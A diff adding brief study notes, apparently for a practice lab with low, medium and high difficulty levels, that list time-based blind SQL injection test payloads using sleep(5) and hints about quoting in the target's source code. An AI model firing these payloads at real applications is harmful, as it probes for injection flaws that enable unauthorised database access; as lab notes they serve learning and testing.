@@ -1,0 +1,16 @@
+#Blind SQLi (Difficulty: Low)
+
+To identify Blind SQL is applicaable or not
+
+1' or sleep(5)#					[Check the source code -> '']
+
+(Difficulty: Medium)
+
+1 or sleep(5)#					[Check the source code no-> '']
+
+(Difficulty: High)
+
+1' or sleep(5)#					[Check the source code-> '']
+
+
+
